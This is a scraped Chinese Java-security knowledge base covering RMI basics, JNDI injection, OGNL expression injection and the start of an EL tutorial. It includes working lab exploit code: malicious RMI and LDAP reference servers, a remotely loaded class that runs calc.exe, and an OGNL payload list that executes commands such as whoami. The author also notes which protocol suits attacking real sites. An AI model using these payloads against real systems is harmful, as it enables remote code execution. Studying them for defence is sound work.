RMI：用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟机中的对象的方法（一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法。），只不过是允许被远程调用的对象要通过一些标志加以标识。 提供服务的一方我们称之为服务器，而实现远程调用的一方我们称之为客户端。 具体实现方法： 远程服务器提供具体的类和方法，本地会通过某种方式获得远程类的一个代理，然后通过这个代理调用远程对象的方法，方法的参数是通过序列化与反序列化的方式传递的，所以： 只要服务端的对象提供了一个方法，这个方法接收的是一个Object类型的参数， 且远程服务器的classpath中存在可利用pop链，那么我们就可以通过在客户端调用这个方法，并传递一个精心构造的对象的方式来攻击rmi服务。 RMI实现机制 要实现RMI，服务器和客户端必须共享同一个接口。Java的RMI规定此接口必须派生自java.rmi.Remote，并在每个方法声明抛出RemoteException。 上面说了本地会通过某种方式获得远程对象的代理，那么具体是怎么的实现机制呢？RMI模式中除了有Client与Server，还借助了一个Registry(注册中心)。 因此，RMI由3个部分构成 第一个是rmiregistry（JDK提供的一个可以独立运行的程序，在bin目录下） 第二个是server端的程序，对外提供远程对象 第三个是client端的程序，想要调用远程对象的方法。 | Server | Registry | Client | | :---: | :---: | :---: | | 提供具体的远程对象 | 一个注册表，存放着远程对象的位置（ip、端口、标识符） | 远程对象的使用者 | 其中Server与Registry可以在同一服务器上实现，也可以布置在不同服务器上，现在一个完整的RMI流程可以大概描述为： 启动Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）。 Server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的 Naming/Context/Registry（下面实例用的Registry）等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称。 Client端通过本地的接口和一个已知的名称（即RMI Registry暴露出的名称）再使用RMI提供的Naming/Context/Registry等类的lookup方法从RMI Server那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法了。 RMI的交互图： PS： 图中的stub就是客户端代理，skeleton就是服务端代理 远程方法调用的通信模式： RMI实现举例 实现过程 大概实现过程 定义远程接口 服务端实现远程接口 服务端注册远程对象 客户端调用接口 实现举例 HelloInterface.java // 定义一个远程接口 package com.company; import java.rmi.Remote; import java.rmi.RemoteException; public interface HelloInterface extends Remote { // 创建接口，必须继承Remote String say (String name) throws RemoteException; // 每个函数必须要抛出 RemoteException 异常 } HelloImpl.java // 实现远程接口 package com.company; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; // 必须要这个，不然会报序列化的错 public class HelloImpl extends UnicastRemoteObject implements HelloInterface { public HelloImpl() throws RemoteException { // 必须要这个 super(); } @Override public String say(String name) throws RemoteException { // 实现刚才定义的接口的方法 return \"test \" + name; } } Server.java // 创建一个注册表，并注册远程对象 package com.company; import java.net.MalformedURLException; import java.rmi.AlreadyBoundException; import java.rmi.Naming; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; //注册远程对象 public class Server { public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException { HelloInterface helloService = new HelloImpl(); LocateRegistry.createRegistry(1099); // 创建 System.setProperty(\"java.rmi.server.hostname\",\"127.0.0.1\"); // 绑定IP，默认是 127.0.0.1 Registry registry = LocateRegistry.getRegistry(); // 获取实例 registry.bind(\"test\",helloService); // 注册远程对象 //Naming.bind(\"test\",helloService); // 上面2行可以用这个替换 } } Client.java // 查找远程调用方法，并且调用远程方法 package com.company; import java.net.MalformedURLException; import java.rmi.Naming; import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Client { public static void main( String[] args ) throws RemoteException, NotBoundException, MalformedURLException { // HelloInterface hello = (HelloInterface) Naming.lookup(\"rmi://127.0.0.1:1099/test\"); // 写法都可 Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1099); HelloInterface hello = (HelloInterface) registry.lookup(\"test\"); System.out.println(hello.says(\"123123\")); } } 注意事项 接口需要继承Remote接口，且方法需要抛出RemoteException错误 接口的实现类需要继承UnicastRemoteObject，同样的方法需要抛出RemoteException错误 如果远程方法需要传参，需要保证参数是可序列化的，我这里传参只是传了字符串，字符串是可序列化的，如果传参是自定义的对象，那么这个对象需要实现Serilizable接口 如果服务端与客户端不在同一主机，需要保证调用的远程对象实现的远程接口在客户端与服务端都存在 参考文章 https://www.jianshu.com/p/5c6f2b6d458a https://blog.csdn.net/qq_28081453/article/details/83279066 https://www.cnblogs.com/fanghao/p/8918953.html https://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:53:30 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/05.RMI基础/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/06.JNDI注入原理及利用/":{"url":"知识库/02.JAVA安全/06.JNDI注入原理及利用/","title":"06.JNDI注入原理及利用","keywords":"","body":" 介绍 结构 JNDI注入 执行方式 利用过程 结果 攻击链分析 RMI 环境 分析 InitialContext.java GenericURLContext.java RegistryContext.java NamingManager.java LDAP 环境 LdapClient.java Server 使用 marshalsec-0.0.3-SNAPSHOT-all.jar 启动一个ldap服务 ExecTest.java 分析 总结 RMI LDAP https://xz.aliyun.com/t/6633 介绍 JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中,就像人的名字或DNS中的域名与IP的关系。 结构 JNDI由JNDI API、命名管理、JNDI SPI（service provider interface）服务提供的接口。我们的应用可以通过JNDI的API去访问相关服务提供的接口 JDNI的服务是可以拓展的，可以从JNDI页面下载其他服务提供商，也可以从远程获得其他服务提供商 JDK包括以下命名/目录服务的服务： 轻型目录访问协议（ldap） 通用对象请求代理体系结构（CORBA），通用对象服务（COS）名称服务 Java远程方法调用（RMI）注册表 域名服务（DNS） Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。 其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等 代码格式如下： String jndiName = \"\"; Context context = new InitiaContext(); DataSource ds = (DataSource) context.lookup(jndiName) 这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。 JNDI注入 JNDI 注入其实就是当上下文中jndiName 这个变量可控的情况下，引发的漏洞，可将远程class文件加载，从而导致远程代码执行（RCE） 测试环境：jdk8u181 // client.java package JNDIInject; import javax.naming.Context; import javax.naming.InitialContext; public class Client { public static void main(String[] args) throws Exception { System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); String uri = \"rmi://127.0.0.1:1099/aa\"; Context context = new InitialContext(); context.lookup(uri); } } // server package JNDIInject; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Server { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1099); Reference aa = new Reference(\"ExecTest\", \"ExecTest\", \"http://127.0.0.1:8081/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa); System.out.println(\"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'\"); registry.bind(\"aa\", refObjWrapper); } } 注意，在服务端代码绑定aa的时候，地址后面一定要加上/ 如果不加上/，那么则向web服务请求恶意字节码的时候，则会找不到该字节码 正确请求如下： //Exec.java public class ExecTest { public ExecTest() throws Exception { System.out.println(\"123\"); } } 执行方式 首先使用jdk8u181 编译ExecTest # jdk 8u181 javac ExecTest.java 然后使用python 启动一个web服务，ExecTest.class 要可访问 利用过程 攻击者提供恶意的rmi注册中心 JNDI 去恶意的rmi注册中心查询aa类 恶意服务器再返回ExecTest.class 字节码文件给客户端 client 再执行ExecTest.class 字节码 结果 此处客户端有一句 System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); jdk = 8u181 , 这里是存在trustCodebaseURL的限制，只信任已有的codebase地址，不能从指定codebase下载字节码 攻击链分析 RMI 环境 jdk8u181 分析 在Client.java 的lookup处打上断点,开始分析, 首先进入context.lookup()的lookup处 InitialContext.java // InitialContext.java public Object lookup(String name) throws NamingException { //getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象 //然后在对应协议中去lookup搜索，我们进入lookup函数 return getURLOrDefaultInitCtx(name).lookup(name); } GenericURLContext.java // GenericURLContext.class // var1 = rmi://127.0.0.1:1099/aa public Object lookup(String var1) throws NamingException { //此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址 //不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext //进入不同的协议路线 // 获取rmi注册中心的相关数据 ResolveResult var2 = this.getRootURLContext(var1, this.myEnv); // 获取注册中心对象 Context var3 = (Context)var2.getResolvedObj(); Object var4; try { // 去注册中心lookup，进入此处 lookup var4 = var3.lookup(var2.getRemainingName()); } finally { var3.close(); } return var4; } RegistryContext.java // RegistryContext.class public Object lookup(Name var1) throws NamingException { if (var1.isEmpty()) { return new RegistryContext(this); } else { // var1 = aa，进入else语句 Remote var2; try { var2 = this.registry.lookup(var1.get(0)); // RMI 客户端与注册中心通信，返回RMI服务IP，地址等信息 } catch (NotBoundException var4) { throw new NameNotFoundException(var1.get(0)); } catch (RemoteException var5) { throw (NamingException)wrapRemoteException(var5).fillInStackTrace(); } return this.decodeObject(var2, var1.getPrefix(1)); // 进入此处decodeObject() } } private Object decodeObject(Remote var1, Name var2) throws NamingException { try { // Reference 对象会进行连接，获取远程class文件地址 Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1; Reference var8 = null; if (var3 instanceof Reference) { var8 = (Reference)var3; } else if (var3 instanceof Referenceable) { var8 = ((Referenceable)((Referenceable)var3)).getReference(); } if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) { throw new ConfigurationException(\"The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.\"); } else { // 获取 Reference 对象，进入此处getObjectInstance return NamingManager.getObjectInstance(var3, var2, this, this.environment); } } catch (NamingException var5) { throw var5; } catch (RemoteException var6) { throw (NamingException)wrapRemoteException(var6).fillInStackTrace(); } catch (Exception var7) { NamingException var4 = new NamingException(); var4.setRootCause(var7); throw var4; } } NamingManager.java 在这里看到了熟悉的newInstance()，实例化，想想写的ExecTest.java 只有一个构造函数，实例化之后，就会执行构造函数中的恶意代码 继续向下看，走到loadClass函数时，就会向工厂请求ExecTest.class 最后在这里实例化ExecTest，执行构造函数的Runtime.getRuntime.exec(),弹出计算器 可以发现命令执行完成了，但是出现了报错，我们可以更换一个命令执行点，在factor.getObjectInstance复写该函数执行命令。 报错原因是因为我们的类在实例化之后不能转换成ObjectFactor (ObjectFactor) clas.newInstance()，只需要我们的类实现该接口即可； // ExecTest.java import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.util.Hashtable; public class ExecTest implements ObjectFactory { public ExecTest() throws Exception { System.out.println(\"123\"); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception { return null; } } LDAP LDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。但看了这个解释等于没说，其实也就是一个数据库，可以把它与mysql对比！ 具有以下特点： 基于TCP/IP协议 同样也是分成服务端/客户端；同样也是服务端存储数据，客户端与服务端连接进行操作 相对于mysql的表型存储；不同的是LDAP使用树型存储 因为树型存储，读性能佳，写性能差，没有事务处理、回滚功能 树层次分为以下几层： dn：一条记录的详细位置，由以下几种属性组成 dc: 一条记录所属区域（哪一个树，相当于MYSQL的数据库） ou：一条记录所处的分叉（哪一个分支，支持多个ou，代表分支后的分支） cn/uid：一条记录的名字/ID（树的叶节点的编号，想到与MYSQL的表主键？） 举个例子一条记录就是 dn=\"uid=aaron.luo,ou=oa,dc=example,dc=com\" 其实利用方法是没差的，我们之前分析的时候也可以看到代码会根据传入协议头的区别去进入对应的处理函数，只需要修改传入参数的解析头,再启动ldap服务，恶意class的web服务即可 环境 jdk8u121(windows) LdapClient.java //ldapClient.java import javax.naming.Context; import javax.naming.InitialContext; public class LdapClient { public static void main(String[] args) throws Exception{ String uri = \"ldap://127.0.0.1:1389/aa\"; Context ctx = new InitialContext(); ctx.lookup(uri); } } Server 使用 marshalsec-0.0.3-SNAPSHOT-all.jar 启动一个ldap服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/#ExecTest ExecTest.java import javax.naming.Context; import javax.naming.Name; import javax.naming.directory.Attributes; import javax.naming.spi.DirObjectFactory; import java.util.Hashtable; public class ExecTest implements DirObjectFactory { public ExecTest() throws Exception{ Runtime.getRuntime().exec(\"calc.exe\"); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment, Attributes attrs) throws Exception { return null; } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception { return null; } } 分析 分析同rmi，在客户端处强制进入lookup 在initialContext.java 中，继续进入lookup，其中name 为传入的uri 在ldapURLContext.java 中，uri 就是 var1，继续lookup，进入lookup GenericURLContext.java 中getRootURLContext 在找协议，以及需要寻找的指定类，继续进入lookup partialConpositeContext.java中，this指代上下文中解析ldap的地址，然后再去寻找ldap结构，进入p_lookup() ComponentContext.java, 传入aa类，再进入c_lookup寻找 LdapCtx.java, 在这里才把codebase找到，以及对应的key值foo，恶意factor ExecTest ，继续跟进 到722行，在这里将var3，var1传入，var3对象包含了className，classFactor，classFactorLocation，这里ldap已经将恶意类信息返回给客户端了，客户端此时则需要向恶意web服务请求字节码，并完成实例化，即可执行恶意类中的命令执行函数，此时我们进入getObjectInstance() DirectorManager.java，看到这里，是不是很熟悉，如果忘记了，请看上面rmi的详解，在这里我们继续进入getObjectFactoryFromReference() NamingManger.java，在这里，我们看到已经请求web服务，获取到字节码了，到clas.newInstance() 这里，就能执行恶意字节码中的恶意代码了 总结 通过分析，我们发现在使用ldap，没有codebase的限制，而rmi在我windows jdk8u121处都有codebase的限制，所以我们在日站的时候最好是使用ldap来进行注入 粘贴一些前人总结的限制吧 RMI JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。 所以不受RMI动态加载恶意类的 java版本应低于7u21、6u45，或者需要设置java.rmi.server.useCodebaseOnly=false系统属性的限制。具有更多的利用空间 但是我们之前实验还是有版本无法复现，是因为在JDK 6u132, JDK 7u122, JDK 8u113版本中，系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类 LDAP 在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制， 在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:51:58 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/06.JNDI注入原理及利用/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/07.OGNL表达式/":{"url":"知识库/02.JAVA安全/07.OGNL表达式/","title":"07.OGNL表达式","keywords":"","body":" 介绍 三要素 使用OGNL表达式 pom.xml 基础用法举例 对Root对象的访问 对上下文对象的访问 对静态变量的访问‼️ 方法的调用‼️ 对数组和集合的访问 投影与选择 创建对象‼️ 和 % 和 $ 的区别 #符 %符 $符 和 . 和 @ 的区别 OGNL表达式注入 注入举例 能解析OGNL的API HTTP请求中常见的注入点 常用payload 参考 介绍 OGNL 是 Object-Graph Navigation Language（对象导航图语言）的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。 Ognl 是一个功能强大的表达式语言，用来获取和设置 java 对象的属性 ，它旨在提供一个更高抽象度语法来对 java 对象图进行导航。 官方文档：https://commons.apache.org/proper/commons-ognl/language-guide.html 对于开发者来说，使用 OGNL，可以用简洁的语法来完成对 java 对象的导航。通常来说：通过一个 “路径” 来完成对象信息的导航，这个 “路径” 可以是到 java bean 的某个属性，或者集合中的某个索引的对象，等等，而不是直接使用 get 或者 set 方法来完成。 三要素 首先来介绍下 OGNL 的三要素： 表达式（Expression）： 表达式是整个 OGNL 的核心内容，所有的 OGNL 操作都是针对表达式解析后进行的。通过表达式来告诉 OGNL 操作到底要干些什么。因此，表达式其实是一个带有语法含义的字符串，整个字符串将规定操作的类型和内容。OGNL 表达式支持大量的表达式，如 “链式访问对象”、表达式计算、甚至还支持 Lambda 表达式。 Root 对象： OGNL 的 Root 对象可以理解为 OGNL 的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是 Root 对象，这就意味着，如果有一个 OGNL 表达式，那么我们需要针对 Root 对象来进行 OGNL 表达式的计算并且返回结果。 上下文环境： 有个 Root 对象和表达式，我们就可以使用 OGNL 进行简单的操作了，如对 Root 对象的赋值与取值操作。但是，实际上在 OGNL 的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL 的上下文环境是一个 Map 结构，称之为 OgnlContext。Root 对象也会被添加到上下文环境当中去。 说白了上下文就是一个 MAP 结构，它实现了 java.utils.Map 的接口。 使用OGNL表达式 pom.xml ognl ognl 3.1.11 基础用法举例 对Root对象的访问 OGNL 使用的是一种链式的风格进行对象的访问，中间使用.进行连接；所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); user.setAge(16); user.setName(\"hello\"); Info info = new Info(\"1\",\"2\"); user.setInfo(info); System.out.println(Ognl.getValue(\"age\", user)); // 16 System.out.println(Ognl.getValue(\"name\", user)); // hello System.out.println(Ognl.getValue(\"name.length\", user)); // 5 System.out.println(Ognl.getValue(\"info\", user)); // Info(a=1, b=2) System.out.println(Ognl.getValue(\"info.a\", user)); // 1 } } @Data class User { private String name; private int age; private Info info; } @Data class Info { private String a; private String b; public Info(String a, String b){ this.a = a; this.b = b; } } 对上下文对象的访问 使用 OGNL 的时候如果不设置上下文对象，系统会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象则会使用传入的上下文对象。 当访问上下文环境当中的参数时候，需要在表达式前面加上 '#' ，表示了与访问 Root 对象的区别。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); user.setAge(16); user.setName(\"hello\"); Info info = new Info(\"1\",\"2\"); user.setInfo(info); Map context = new HashMap(); context.put(\"test\", \"testValue\"); context.put(\"aaa\", user); System.out.println(Ognl.getValue(\"#test\", context, user)); // testValue System.out.println(Ognl.getValue(\"#aaa\", context, user)); // User(name=hello, age=16, info=Info(a=1, b=2)) System.out.println(Ognl.getValue(\"#aaa.name\", context, user)); // hello } } @Data class User { private String name; private int age; private Info info; } @Data class Info { private String a; private String b; public Info(String a, String b){ this.a = a; this.b = b; } } 对静态变量的访问‼️ 在 OGNL 表达式当中也可以访问静态变量或者调用静态方法，格式如 @[class]@[field/method()]。 package org.example; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static String test = \"66666\"; public static void main(String[] args) throws OgnlException { System.out.println(Ognl.getValue(\"@org.example.OgnlTest@test\", null)); } } 方法的调用‼️ 如果需要调用 Root 对象或者上下文对象当中的方法也可以使用类似的方式来调用。甚至可以传入参数。 赋值的时候可以选择上下文当中的元素进行给 Root 对象的 name 属性赋值。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); Map context = new HashMap(); context.put(\"test\", \"testValue\"); context.put(\"aaa\", user); System.out.println(Ognl.getValue(\"getName()\", context, user)); // null Ognl.getValue(\"setName(#test)\", context, user); // 执行setName方法 System.out.println(Ognl.getValue(\"getName()\", context, user)); // testValue } } @Data class User { private String name; private int age; } 对数组和集合的访问 OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问。 package org.example; import ognl.Ognl; import ognl.OgnlException; import java.util.ArrayList; import java.util.HashMap; import java.util.List; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { List list = new ArrayList<>(); list.add(\"123\"); list.add(\"456\"); Map map = new HashMap(); map.put(\"test1\", \"value1\"); Map context = new HashMap(); context.put(\"list\", list); context.put(\"map\", map); System.out.println(Ognl.getValue(\"#list[0]\", context, list)); // 123 System.out.println(Ognl.getValue(\"#map['test1']\", context, map)); // value1 } } 投影与选择 OGNL 支持类似数据库当中的选择与投影功能。 个人感觉有点类似stream 投影：选出集合当中的相同属性组合成一个新的集合。语法为 collection.{XXX}，XXX 就是集合中每个元素的公共属性。 选择：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为 collection.{Y XXX}，其中 Y 是一个选择操作符，XXX 是选择用的逻辑表达式。 选择操作符有 3 种： ? ：选择满足条件的所有元素 ^：选择满足条件的第一个元素 $：选择满足条件的最后一个元素 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.ArrayList; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User u1 = new User(\"name1\", 11); User u2 = new User(\"name2\", 22); User u3 = new User(\"name3\", 33); User u4 = new User(\"name4\", 44); ArrayList list = new ArrayList(); list.add(u1); list.add(u2); list.add(u3); list.add(u4); Map context = new HashMap(); context.put(\"list\", list); System.out.println(Ognl.getValue(\"#list.{age}\", context, list)); // [11, 22, 33, 44] System.out.println(Ognl.getValue(\"#list.{? #this.age > 22}\", context, list)); // [User(name=name3, age=33), User(name=name4, age=44)] System.out.println(Ognl.getValue(\"#list.{^ #this.age > 22}\", context, list)); // [User(name=name3, age=33)] System.out.println(Ognl.getValue(\"#list.{$ #this.age > 22}\", context, list)); // [User(name=name4, age=44)] } } @Data class User { private String name; private int age; public User(String name, int age) { this.name = name; this.age = age; } } 创建对象‼️ OGNL 支持直接使用表达式来创建对象。主要有三种情况： 构造 List 对象：使用 {}, 中间使用 ',' 进行分割如 {\"aa\", \"bb\", \"cc\"} 构造 Map 对象：使用 #{}，中间使用 ', 进行分割键值对，键值对使用 ':' 区分，如 #{\"key1\" : \"value1\", \"key2\" : \"value2\"} 构造任意对象：直接使用已知的对象的构造方法进行构造。 System.out.println(Ognl.getValue(\"{'key1','value1'}\", null)); // [key1, value1] System.out.println(Ognl.getValue(\"#{'key1':'value1'}\", null)); // {key1=value1} System.out.println(Ognl.getValue(\"new java.lang.String('123')\", null)); // 123 # 和 % 和 $ 的区别 #符 #符主要有三种用途： 访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于ActionContext.getContext()； 用于过滤和投影（projecting）集合，如books.{? #this.price； 用于构造Map，如#{'foo1':'bar1', 'foo2':'bar2'}； %符 %符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。 $符 $符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）。 # 和 . 和 @ 的区别 获取静态函数和变量的时候用@ 获取非静态函数用.号获取 获取非静态变量用#获取 OGNL表达式注入 webwork2和现在的Struts2.x中使用OGNL取代原来的EL来做界面数据绑定，所谓界面数据绑定，也就是把界面元素（例如一个textfield,hidden)和对象层某个类的某个属性绑定在一起，修改和显示自动同步。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。 由前面知道，OGNL可以访问静态方法、属性以及对象方法等，其中包含可以执行恶意操作如命令执行的类java.lang.Runtime等，当OGNL表达式外部可控时，攻击者就可以构造恶意的OGNL表达式来让程序执行恶意操作，这就是OGNL表达式注入漏洞。 注入举例 格式@[class]@[field/method()] package org.example; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static void main(String[] args) throws OgnlException { // @[class]@[field/method()] String payload = \"@java.lang.Runtime@getRuntime().exec('open -na Calculator')\"; System.out.println(Ognl.getValue(payload, null)); } } 能解析OGNL的API 能解析OGNL的API如下表： 类名 方法名 com.opensymphony.xwork2.util.TextParseUtil translateVariables,translateVariablesCollection com.opensymphony.xwork2.util.TextParser evaluate com.opensymphony.xwork2.util.OgnlTextParser evaluate com.opensymphony.xwork2.ognl.OgnlUtil setProperties,setProperty,setValue,getValue,callMethod,compile com.opensymphony.xwork2.util.ValueStack findString,findValue,setValue,setParameter com.opensymphony.xwork2.ognl.OgnlValueStack findString,findValue,setValue,setParameter,trySetValue org.apache.struts2.util.VelocityStrutsUtil evaluate org.apache.struts2.util.StrutsUtil isTrue,findString,findValue,getText,translateVariables,makeSelectList org.apache.struts2.views.jsp.ui.OgnlTool findValue ognl.Ognl parseExpression,getValue,setValue 以下是调用过程中可能会涉及到的一些类： 涉及类名 方法名 com.opensymphony.xwork2.ognl.OgnlReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue com.opensymphony.xwork2.util.reflection.ReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue HTTP请求中常见的注入点 常用payload //获取context里面的变量值 #user #user.name //使用runtime执行系统命令 @java.lang.Runtime@getRuntime().exec(\"calc\") //使用processbuilder执行系统命令 (new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start() //获取当前绝对路径 @java.lang.System@getProperty(\"user.dir\") // e-mobole带回显 @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()) 参考 OGNL表达式注入漏洞总结 Struts2著名RCE漏洞引发的十年之思 Struts2 中的OGNL、表达式注入及防御 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:56:42 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/07.OGNL表达式/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/08.EL表达式/":{"url":"知识库/02.JAVA安全/08.EL表达式/","title":"08.EL表达式","keywords":"","body":" 介绍 快速搭建tomcat环境 前期准备 环境搭建 EL表达式使用 EL基础语法 [ ]与.运算符 获取变量举例 操作符 隐含对象 函数 禁用/启用EL表达式 EL表达式注入 EL表达式注入绕过 参考 介绍 EL 全名为Expression Language，是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。 EL主要作用： 获取数据 EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的web域 中检索java对象、获取数据。(某个web域 中的对象，访问javabean的属性、访问list集合、访问map集合、访问数组) 执行运算 利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算。${user==null} 获取web开发常用对象 EL 表达式定义了一些隐式对象，利用这些隐式对象，web开发人员可以很轻松获得对web常用对象的引用，从而获得这些对象中的数据。 调用Java方法 EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法。 快速搭建tomcat环境 因为需要使用到JSP来学习EL表达式，所以想法是快速搭一个tomcat环境，之前采用的是添加tomcat依赖到pom.xml的方法，使用内置tomcat，但是感觉搭建环境速度太慢了，所以学了个新的方法来快速搭建tomcat环境 参考：https://blog.51cto.com/u_15119353/3309943 前期准备 tomcat可用版 IDEA tomcat各版本下载地址：https://archive.apache.org/dist/tomcat/tomcat-8/ 环境搭建 先建一个平平无奇的Java项目 然后右键，选择Add Framework Support... 勾选Web Application 这个时候就会多一个web目录，也就是我们的webapps目录 打开Project Structure窗口，新建2个文件夹在WEB-INF目录下，分别是classes和lib，这一步是为了添加项目类路径 修改编译后的类路径到我们刚才新建的classes目录下 添加本地tomcat服务器 配置好需要的信息，然后Fix修复一下 给应用上下文路径设置为跟路径，如果这里设置为/a 则访问就变成 localhost:8080/a/ 然后启动运行即可 项目结构 EL表达式使用 EL基础语法 在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以${}表示。 例如，${userinfo}代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：${pageScope.userinfo}表示访问page范围中的userinfo变量。 简单地说，使用EL表达式语法：${EL表达式} 其中，EL表达式和JSP代码等价转换。事实上，可以将EL表达式理解为一种简化的JSP代码。 扩展JSP代码的写法总结： JSP表达式： 向浏览器输出变量或表达式的计算结果。 JSP脚本： 执行java代码的原理：翻译到_jspService()方法中。 JSP声明： 声明jsp的成员变量或成员方法。 JSP注释： 用于注释JSP代码，不会翻译到Java文件中，也不会执行。 [ ]与.运算符 EL表达式提供.和[]两种运算符来存取数据。 当要存取的属性名称中包含一些特殊字符，如.或-等并非字母或数字的符号，就一定要使用[]。例如：${user.My-Name}应当改为${user[\"My-Name\"]}。 